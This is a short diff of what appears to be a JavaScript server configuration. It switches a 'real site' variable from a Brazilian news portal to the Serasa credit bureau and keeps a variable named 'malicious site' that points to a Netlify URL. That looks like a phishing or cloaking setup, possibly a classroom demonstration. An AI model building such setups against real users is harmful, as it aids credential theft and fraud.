@@ -13,7 +13,7 @@ const port = 3000;
 
 
 /* ---------------------------------- Modifique abaixo */ 
-const siteReal = "https://g1.globo.com/"
+const siteReal = "https://www.serasa.com.br/"
 
 const siteMalicioso = "https://chipper-croquembouche-52e4a4.netlify.app/"
 /* ----------------------------------*/ 
